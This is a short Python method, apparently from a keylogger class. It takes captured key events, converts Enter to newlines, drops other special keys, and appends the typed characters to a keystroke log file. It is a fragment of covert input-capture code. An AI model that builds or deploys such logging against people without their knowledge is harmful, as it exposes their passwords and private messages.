def write_file(self):
        with open(self.file_path + self.extend + self.keys_information, "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k == "Key.enter":
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
            self.keys = []